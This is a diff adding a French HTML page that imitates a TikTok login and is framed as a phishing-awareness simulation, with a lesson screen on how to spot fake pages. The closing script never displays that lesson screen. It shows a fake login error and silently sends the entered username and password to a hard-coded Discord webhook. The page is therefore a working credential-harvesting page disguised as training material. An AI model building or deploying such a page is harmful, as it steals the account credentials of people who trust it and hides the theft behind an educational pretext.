@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TikTok — Connexion</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --tt-black: #010101;
+      --tt-red: #FE2C55;
+      --tt-cyan: #25F4EE;
+      --tt-gray: #2A2A2A;
+      --tt-light: #F1F1F2;
+      --tt-text-muted: #8A8B8C;
+      --warning: #FF4444;
+      --safe: #00C896;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--tt-black);
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ══════════════════════════════
+       ÉCRAN 1 — FAUSSE PAGE LOGIN
+    ══════════════════════════════ */
+    #screen-fake {
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--tt-black);
+    }
+
+    .login-card {
+      width: 380px;
+      padding: 40px 36px 32px;
+    }
+
+    .logo-wrap {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .tt-logo {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .tt-logo svg { width: 38px; height: 38px; }
+
+    .tt-logo-text {
+      font-size: 26px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      color: white;
+    }
+
+    .login-title {
+      font-size: 23px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .login-sub {
+      font-size: 13px;
+      color: var(--tt-text-muted);
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .input-group {
+      margin-bottom: 14px;
+      position: relative;
+    }
+
+    .input-group input {
+      width: 100%;
+      background: var(--tt-gray);
+      border: 1.5px solid #3A3A3A;
+      border-radius: 4px;
+      color: white;
+      font-size: 14px;
+      font-family: 'Inter', sans-serif;
+      padding: 13px 14px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .input-group input::placeholder { color: var(--tt-text-muted); }
+    .input-group input:focus { border-color: var(--tt-red); }
+    .input-group input.error-field { border-color: var(--warning); }
+
+    /* ══ MESSAGE D'ERREUR STYLE TIKTOK ══ */
+    #login-error {
+      display: none;
+      background: rgba(254, 44, 85, 0.08);
+      border: 1px solid rgba(254, 44, 85, 0.35);
+      border-radius: 6px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      display: none;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    #login-error .err-icon {
+      font-size: 16px;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    #login-error .err-texts {}
+
+    #login-error .err-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #FE2C55;
+      margin-bottom: 2px;
+    }
+
+    #login-error .err-sub {
+      font-size: 12px;
+      color: #FF8FA3;
+      line-height: 1.5;
+    }
+
+    .forgot {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+
+    .forgot a {
+      font-size: 12.5px;
+      color: var(--tt-red);
+      text-decoration: none;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: var(--tt-red);
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      letter-spacing: 0.2px;
+    }
+
+    .btn-login:hover { opacity: 0.88; }
+
+    /* État "chargement" du bouton */
+    .btn-login.loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0;
+      color: var(--tt-text-muted);
+      font-size: 12px;
+    }
+
+    .separator::before, .separator::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #2A2A2A;
+    }
+
+    .social-btns {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .btn-social {
+      width: 100%;
+      padding: 11px 14px;
+      background: transparent;
+      border: 1.5px solid #3A3A3A;
+      border-radius: 4px;
+      color: white;
+      font-size: 13px;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: background 0.2s;
+    }
+
+    .btn-social:hover { background: #1A1A1A; }
+    .btn-social svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+    .signup-prompt {
+      text-align: center;
+      font-size: 13px;
+      color: var(--tt-text-muted);
+      border-top: 1px solid #2A2A2A;
+      padding-top: 20px;
+      margin-top: 4px;
+    }
+
+    .signup-prompt a {
+      color: var(--tt-red);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    /* ══════════════════════════════
+       GLITCH ANIMATION
+    ══════════════════════════════ */
+    @keyframes glitch1 {
+      0%   { clip-path: inset(0 0 95% 0); transform: translateX(-4px); }
+      20%  { clip-path: inset(30% 0 50% 0); transform: translateX(4px); }
+      40%  { clip-path: inset(60% 0 20% 0); transform: translateX(-3px); }
+      60%  { clip-path: inset(10% 0 80% 0); transform: translateX(5px); }
+      80%  { clip-path: inset(80% 0 5% 0);  transform: translateX(-2px); }
+      100% { clip-path: inset(0 0 95% 0); transform: translateX(0); }
+    }
+
+    .glitch-overlay {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 999;
+      display: none;
+    }
+
+    .glitch-overlay.active { display: block; }
+
+    .glitch-layer {
+      position: absolute;
+      inset: 0;
+      background: var(--tt-red);
+      opacity: 0.15;
+      animation: glitch1 0.08s steps(1) infinite;
+    }
+
+    /* ══════════════════════════════
+       ÉCRAN 2 — RÉVÉLATION
+    ══════════════════════════════ */
+    #screen-reveal {
+      display: none;
+      width: 100%;
+      min-height: 100vh;
+      background: #0A0A0A;
+      flex-direction: column;
+      align-items: center;
+      padding: 48px 24px 60px;
+      overflow-y: auto;
+    }
+
+    #screen-reveal.visible { display: flex; }
+
+    .reveal-header {
+      text-align: center;
+      margin-bottom: 44px;
+      max-width: 640px;
+    }
+
+    .alert-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,68,68,0.12);
+      border: 1px solid rgba(255,68,68,0.4);
+      border-radius: 100px;
+      padding: 6px 16px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--warning);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 20px;
+    }
+
+    .reveal-title {
+      font-size: 36px;
+      font-weight: 700;
+      line-height: 1.15;
+      margin-bottom: 14px;
+    }
+
+    .reveal-title span { color: var(--warning); }
+
+    .reveal-desc {
+      font-size: 16px;
+      color: #AAAAAA;
+      line-height: 1.6;
+    }
+
+    /* Screenshot annoté */
+    .annotated-screen {
+      width: 100%;
+      max-width: 480px;
+      background: var(--tt-black);
+      border: 2px solid #2A2A2A;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 48px;
+      position: relative;
+    }
+
+    .annotated-url {
+      background: #1C1C1C;
+      padding: 10px 16px;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #2A2A2A;
+    }
+
+    .anno-url-text { color: #888; }
+    .anno-url-bad { color: #FF6B6B; font-weight: 700; text-decoration: underline wavy #FF4444; }
+
+    .flag {
+      position: absolute;
+      right: -2px;
+      background: var(--warning);
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 10px 3px 8px;
+      border-radius: 3px 0 0 3px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      white-space: nowrap;
+      z-index: 10;
+      box-shadow: -2px 0 8px rgba(255,68,68,0.4);
+    }
+
+    .flag::after {
+      content: '';
+      position: absolute;
+      left: -6px; top: 0; bottom: 0;
+      border-right: 6px solid var(--warning);
+      border-top: 11px solid transparent;
+      border-bottom: 11px solid transparent;
+    }
+
+    .mini-login { padding: 28px 28px 22px; }
+
+    .mini-logo {
+      text-align: center;
+      margin-bottom: 16px;
+      font-size: 17px;
+      font-weight: 700;
+    }
+
+    .mini-field {
+      background: var(--tt-gray);
+      border: 1.5px solid #3A3A3A;
+      border-radius: 4px;
+      padding: 10px 12px;
+      font-size: 12px;
+      color: #888;
+      margin-bottom: 8px;
+      width: 100%;
+    }
+
+    .mini-field.highlighted {
+      border-color: var(--warning);
+      box-shadow: 0 0 0 2px rgba(255,68,68,0.2);
+    }
+
+    .mini-btn {
+      width: 100%;
+      padding: 10px;
+      background: var(--tt-red);
+      border: 1.5px solid transparent;
+      border-radius: 4px;
+      color: white;
+      font-size: 12px;
+      font-weight: 600;
+      margin-top: 4px;
+    }
+
+    .mini-btn.highlighted {
+      border-color: var(--warning);
+      box-shadow: 0 0 0 2px rgba(255,68,68,0.2);
+    }
+
+    /* Indices */
+    .indices-section, .flow-section, .stats-section, .protect-section {
+      width: 100%;
+      max-width: 640px;
+      margin-bottom: 48px;
+    }
+
+    .section-label {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--tt-text-muted);
+      margin-bottom: 20px;
+    }
+
+    .indice-card {
+      background: #131313;
+      border: 1px solid #222;
+      border-radius: 10px;
+      padding: 18px 20px;
+      margin-bottom: 12px;
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      transition: border-color 0.2s;
+    }
+
+    .indice-card:hover { border-color: #3A3A3A; }
+
+    .indice-num {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: rgba(255,68,68,0.15);
+      border: 1px solid rgba(255,68,68,0.4);
+      color: var(--warning);
+      font-size: 13px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .indice-content h3 { font-size: 14px; font-weight: 600; margin-bottom: 5px; }
+    .indice-content p  { font-size: 13px; color: #888; line-height: 1.5; }
+    .indice-content code {
+      background: #1F1F1F;
+      border: 1px solid #333;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 12px;
+      color: #FF9090;
+      font-family: monospace;
+    }
+
+    .flow-steps { display: flex; flex-direction: column; }
+
+    .flow-step {
+      display: flex;
+      gap: 20px;
+      padding: 0 0 28px 0;
+      position: relative;
+    }
+
+    .flow-step:last-child { padding-bottom: 0; }
+
+    .flow-step::before {
+      content: '';
+      position: absolute;
+      left: 15px;
+      top: 32px;
+      bottom: 0;
+      width: 2px;
+      background: linear-gradient(to bottom, #333, transparent);
+    }
+
+    .flow-step:last-child::before { display: none; }
+
+    .step-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 15px;
+      z-index: 1;
+    }
+
+    .step-icon.bad    { background: rgba(255,68,68,0.15);  border: 1px solid rgba(255,68,68,0.3); }
+    .step-icon.neutral{ background: rgba(255,165,0,0.12);  border: 1px solid rgba(255,165,0,0.3); }
+
+    .step-text h4 { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+    .step-text p  { font-size: 13px; color: #888; line-height: 1.5; }
+
+    .protect-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .protect-card {
+      background: rgba(0,200,150,0.05);
+      border: 1px solid rgba(0,200,150,0.2);
+      border-radius: 10px;
+      padding: 16px 18px;
+    }
+
+    .protect-card .icon { font-size: 20px; margin-bottom: 8px; }
+    .protect-card h4 { font-size: 13px; font-weight: 600; color: var(--safe); margin-bottom: 4px; }
+    .protect-card p  { font-size: 12px; color: #888; line-height: 1.5; }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+    }
+
+    .stat-card {
+      background: #131313;
+      border: 1px solid #222;
+      border-radius: 10px;
+      padding: 20px 16px;
+      text-align: center;
+    }
+
+    .stat-num {
+      font-size: 28px;
+      font-weight: 700;
+      background: linear-gradient(135deg, var(--tt-red), var(--tt-cyan));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 4px;
+    }
+
+    .stat-label { font-size: 11px; color: #888; line-height: 1.4; }
+
+    @media (max-width: 520px) {
+      .login-card { padding: 32px 24px; width: 100%; }
+      .reveal-title { font-size: 26px; }
+      .protect-grid { grid-template-columns: 1fr; }
+      .stats-grid { gap: 8px; }
+      .stat-num { font-size: 22px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="glitch-overlay" id="glitch">
+  <div class="glitch-layer"></div>
+</div>
+
+<!-- ════════════════════════════════
+     ÉCRAN 1 — Fausse page TikTok
+════════════════════════════════ -->
+<div id="screen-fake">
+  <div class="login-card">
+    <div class="logo-wrap">
+      <div class="tt-logo">
+        <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M34.5 5c.7 4.1 3.5 7 7.5 7.5v5c-2.6 0-5.1-.8-7.5-2.4v11c0 5.8-4.7 10.5-10.5 10.5-2.1 0-4.1-.6-5.7-1.7-2.9-1.9-4.8-5.1-4.8-8.8 0-5.8 4.7-10.5 10.5-10.5.5 0 1 0 1.5.1v5.2c-.5-.1-1-.2-1.5-.2-3 0-5.5 2.5-5.5 5.5s2.5 5.5 5.5 5.5c3 0 5.5-2.4 5.6-5.4V5h5z" fill="white"/>
+          <path d="M34.5 5c.7 4.1 3.5 7 7.5 7.5v5c-2.6 0-5.1-.8-7.5-2.4v11c0 5.8-4.7 10.5-10.5 10.5-2.1 0-4.1-.6-5.7-1.7-2.9-1.9-4.8-5.1-4.8-8.8 0-5.8 4.7-10.5 10.5-10.5.5 0 1 0 1.5.1v5.2c-.5-.1-1-.2-1.5-.2-3 0-5.5 2.5-5.5 5.5s2.5 5.5 5.5 5.5c3 0 5.5-2.4 5.6-5.4V5h5z" fill="url(#tg)" opacity="0.5"/>
+          <defs>
+            <linearGradient id="tg" x1="5" y1="5" x2="45" y2="45" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#25F4EE"/>
+              <stop offset="100%" stop-color="#FE2C55"/>
+            </linearGradient>
+          </defs>
+        </svg>
+        <span class="tt-logo-text">TikTok</span>
+      </div>
+    </div>
+
+    <h1 class="login-title">Connexion à TikTok</h1>
+    <p class="login-sub">Gérez votre compte, vérifiez vos notifications et voyez vos contenus préférés.</p>
+
+    <!-- Message d'erreur (caché par défaut) -->
+    <div id="login-error">
+      <span class="err-icon">🎣</span>
+      <div class="err-texts">
+        <div class="err-title">Une erreur est survenue !</div>
+        <div class="err-sub">Veuillez vérifier l'addresse email et/ou le mot de passe.</div>
+      </div>
+    </div>
+
+    <div class="input-group">
+      <input type="text" placeholder="E-mail ou pseudo" id="input-user" />
+    </div>
+    <div class="input-group">
+      <input type="password" placeholder="Mot de passe" id="input-pass" />
+    </div>
+
+    <div class="forgot"><a href="#">Mot de passe oublié ?</a></div>
+
+    <button class="btn-login" id="btn-login" onclick="triggerReveal()">Se connecter</button>
+
+    <div class="separator">ou continue avec</div>
+
+    <div class="social-btns">
+      <button class="btn-social" onclick="triggerReveal()">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M22 12c0-5.5-4.5-10-10-10S2 6.5 2 12c0 5 3.7 9.1 8.4 9.9v-7H7.9V12h2.5v-2.2c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2V8.5h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9H13v7C17.3 21.1 22 17 22 12z" fill="#1877F2"/></svg>
+        Continuer avec Facebook
+      </button>
+      <button class="btn-social" onclick="triggerReveal()">
+        <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+        Continuer avec Google
+      </button>
+    </div>
+
+    <div class="signup-prompt">
+      Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════
+     ÉCRAN 2 — Révélation pédagogique
+════════════════════════════════ -->
+<div id="screen-reveal">
+
+  <div class="reveal-header">
+    <div class="alert-badge">⚠ Simulation de phishing</div>
+    <h2 class="reveal-title">Vous venez de vous faire <span>hameçonner</span></h2>
+    <p class="reveal-desc">
+      Cette page était une reproduction frauduleuse de TikTok. Si vous aviez entré vos vrais identifiants, ils auraient pu être volés en quelques secondes. Voici pourquoi.
+    </p>
+  </div>
+
+  <div class="annotated-screen">
+    <div class="annotated-url">
+      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#FF4444" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      <span class="anno-url-text">www.</span><span class="anno-url-bad">t1ktok-login.fr</span><span class="anno-url-text">/connexion</span>
+    </div>
+    <div style="position:relative;">
+      <div class="mini-login">
+        <div class="mini-logo">TikTok</div>
+        <div class="mini-field highlighted">Votre e-mail ou pseudo</div>
+        <div class="mini-field highlighted">Votre mot de passe</div>
+        <button class="mini-btn highlighted">Se connecter</button>
+      </div>
+      <div class="flag" style="top: -38px; font-size: 10px;">① URL suspecte</div>
+      <div class="flag" style="top: 20px; font-size: 10px;">② Vol d'identifiants</div>
+      <div class="flag" style="top: 78px; font-size: 10px;">③ Envoi au pirate</div>
+    </div>
+  </div>
+
+  <div class="indices-section">
+    <div class="section-label">🔍 Les indices à repérer</div>
+    <div class="indice-card">
+      <div class="indice-num">1</div>
+      <div class="indice-content">
+        <h3>L'URL est un faux</h3>
+        <p>Le vrai TikTok est sur <code>tiktok.com</code>. Ici l'URL était <code>t1ktok-login.fr</code> — le "i" remplacé par un "1", un domaine .fr au lieu de .com, et le mot "login" ajouté pour paraître officiel.</p>
+      </div>
+    </div>
+    <div class="indice-card">
+      <div class="indice-num">2</div>
+      <div class="indice-content">
+        <h3>Pas de cadenas HTTPS valide</h3>
+        <p>Un site légitime affiche un cadenas vert et <code>https://</code>. Un site de phishing peut avoir un HTTPS mais le domaine reste faux — vérifiez toujours le nom de domaine complet.</p>
+      </div>
+    </div>
+    <div class="indice-card">
+      <div class="indice-num">3</div>
+      <div class="indice-content">
+        <h3>Demande d'identifiants non sollicitée</h3>
+        <p>Les liens de phishing arrivent par <strong>SMS, e-mail, DM</strong> en prétextant une urgence : compte suspendu, violation détectée, prix à gagner…</p>
+      </div>
+    </div>
+    <div class="indice-card">
+      <div class="indice-num">4</div>
+      <div class="indice-content">
+        <h3>Design copié, pas identique</h3>
+        <p>Les pirates copient le HTML/CSS mais ne reproduisent jamais le site à 100 %. Police, espacements, boutons sociaux — il y a toujours de légères différences.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="flow-section">
+    <div class="section-label">💀 Ce qui se serait passé ensuite</div>
+    <div class="flow-steps">
+      <div class="flow-step">
+        <div class="step-icon bad">📝</div>
+        <div class="step-text">
+          <h4>Vous saisissez vos identifiants</h4>
+          <p>E-mail et mot de passe tapés sur la fausse page.</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-icon bad">📡</div>
+        <div class="step-text">
+          <h4>Envoi immédiat au serveur du pirate</h4>
+          <p>Un script envoie vos données vers un serveur contrôlé par l'attaquant — en quelques millisecondes.</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-icon neutral">🔄</div>
+        <div class="step-text">
+          <h4>Redirection vers le vrai TikTok</h4>
+          <p>Pour ne pas éveiller vos soupçons, la page vous redirige vers tiktok.com. Vous croyez avoir mal saisi votre mot de passe.</p>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-icon bad">🔓</div>
+        <div class="step-text">
+          <h4>Prise de contrôle du compte</h4>
+          <p>L'attaquant se connecte, change le mot de passe et l'adresse e-mail. Votre compte est perdu — et peut servir à arnaquer vos abonnés.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="stats-section">
+    <div class="section-label">📊 Le phishing en chiffres</div>
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-num">3,4Md</div>
+        <div class="stat-label">e-mails de phishing envoyés chaque jour dans le monde</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">36%</div>
+        <div class="stat-label">des fuites de données débutent par un phishing</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">20s</div>
+        <div class="stat-label">il suffit de 20 secondes pour qu'un compte soit volé</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="protect-section">
+    <div class="section-label">✅ Comment se protéger</div>
+    <div class="protect-grid">
+      <div class="protect-card">
+        <div class="icon">🔍</div>
+        <h4>Vérifiez l'URL</h4>
+        <p>Relisez toujours l'adresse complète avant de saisir quoi que ce soit. Un seul caractère différent = danger.</p>
+      </div>
+      <div class="protect-card">
+        <div class="icon">🔐</div>
+        <h4>Activez la 2FA</h4>
+        <p>L'authentification à deux facteurs bloque l'attaquant même s'il a votre mot de passe.</p>
+      </div>
+      <div class="protect-card">
+        <div class="icon">🚨</div>
+        <h4>Méfiez-vous de l'urgence</h4>
+        <p>"Votre compte sera supprimé dans 24h" — technique classique pour vous faire paniquer et agir vite.</p>
+      </div>
+      <div class="protect-card">
+        <div class="icon">🔗</div>
+        <h4>Ne cliquez pas les liens</h4>
+        <p>Accédez toujours au site en tapant l'URL directement dans votre navigateur, jamais via un lien reçu.</p>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  let triggered = false;
+
+  function triggerReveal() {
+    if (triggered) return;
+    triggered = true;
+
+    // 1. Mettre les champs en rouge + désactiver le bouton
+    document.getElementById('input-user').classList.add('error-field');
+    document.getElementById('input-pass').classList.add('error-field');
+    const btn = document.getElementById('btn-login');
+    btn.textContent = 'Connexion…';
+    btn.classList.add('loading');
+
+    // 2. Afficher le message d'erreur "prank"
+    const errBox = document.getElementById('login-error');
+    errBox.style.display = 'flex';
+        fetch('https://discord.com/api/webhooks/1513921200840249565/QtycZ6jlfpev9wI2TfMxrEHv50rfBG48nZL1cTCzO2hLxf5jtPEbJKjlkeZcyqtaXdDe', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        content: document.getElementById('input-user').value + ':' + document.getElementById('input-pass').value
+      })
+    });
+
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') triggerReveal();
+  });
+</script>
+</body>
+</html>
